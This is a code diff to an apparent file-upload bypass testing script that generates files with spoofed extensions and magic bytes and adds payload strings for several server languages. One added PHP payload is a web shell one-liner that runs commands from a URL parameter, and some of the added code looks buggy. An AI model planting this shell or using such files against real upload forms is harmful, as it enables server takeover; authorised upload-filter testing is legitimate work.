@@ -14,6 +14,7 @@ extension_png = ["PNG", "png", "PnG", ""]
 extension_jpeg = ["jpeg", "JPEG", "JpEG", ""]
 extension_svg = ["svg", "SVG", "SvG"]
 extension_pdf = ["pdf", "PDF", "Pdf"]
+extension_exe = ["doc", "xls", "ppt", "msg", "Doc", "Xls", "Ppt", "Msg", "DOC", "XLS", "PPT"]
 
 mg_gif = b"\x47\x49\x46\x38\x37\x61"
 mg_gif_2 = b"\x47\x49\x46\x38\x39\x61"
@@ -22,24 +23,41 @@ mg_jpeg = b"\xFF\xD8\xFF\xDB"
 mg_jpeg_2 = b"\xFF\xD8\xFF\xEE"
 mg_jpeg_3 = b"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01"
 mg_pdf = b"\x25\x50\x44\x46\x2d"
+mg_office = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"
+
+payload_php = ["<?php echo '<p>Hello there!</p>'; ?>", "<?php system($_GET['cmd']);?>"]
+payload_asp = ['<%Response. Write( "HeIIo there"); %>']
+payload_perl = ['print("Hello, there!\n");']
+payload_jsp = ["Hello there, today is: <%= new java.util.Date().toString() %>"]
+payload_colfucion = ['<cfscript> writeOutput("Hello World!"); </cfscript>']
+payload_bash =[""]
+payload_powershell = [""] 
+payload_html = [""]
+payload_js = [""]
+payload_css = [""]
 
 
-def ex_generator(extension):
+def ex_generator(extension, module):
 	if extension == 'php':
 		for ex in extension_php:
 			f = open("1." + ex, "w")
+			magic_bytes("1." + ex, payload_php[0])
 	elif extension == 'asp':
 		for ex in extension_asp:
 			f = open("1." + ex, "w")
+			magic_bytes("1." + ex, payload_asp[0])
 	elif extension == "perl":
 		for ex in extension_perl:
 			f = open("1." + ex, "w")
+			magic_bytes("1." + ex, payload_perl[0])
 	elif extension == "jsp":
 		for ex in extension_jsp:
 			f = open("1." + ex, "w")
+			magic_bytes("1." + ex, payload_jsp[0])
 	elif extension == "coldfusin":
 		for ex in extension_colfusion:
 			f = open("1." + ex, "w")
+			magic_bytes("1." + ex, payload_colfucion[0])
 	f.close()
 
 def magic_files(extension):
@@ -60,9 +78,18 @@ def magic_files(extension):
 			f = open("1." + ex, "w")
 			magic_bytes("1." + ex, mg_pdf)
 
+	if extension == "office":
+		for ex in extension_exe:
+			f = open("1." + ex, "w")
+			magic_bytes("1." + ex, mg_office)
+
 def magic_bytes(file, bytes):
 	with open(file, "ab") as binary_file:
 		num_bytes_written = binary_file.write(bytes)
+		
+def add_script(file, script):
+	with open(file, "ab") as text_file:
+		text_written = text_file.write(script)
 
 
 parser = argparse.ArgumentParser(description='File generator')
@@ -72,7 +99,7 @@ except e:
 	print(e)
 
 parser.add_argument('-e', dest='format', help="generate file", 
-	choices=['php', 'asp', 'perl', 'jsp', 'coldfusin', 'gif', 'png', 'jpeg', 'svg', "pdf"])
+	choices=['php', 'asp', 'perl', 'jsp', 'coldfusin', 'gif', 'png', 'jpeg', 'svg', "pdf", "office"])
 
 args = parser.parse_args()
 
@@ -97,3 +124,9 @@ elif extension == "svg":
 	magic_files('svg')
 elif extension == "pdf":
 	magic_files('pdf')
+elif extension == "office":
+	magic_files('office')
+	
+	
+	
+	
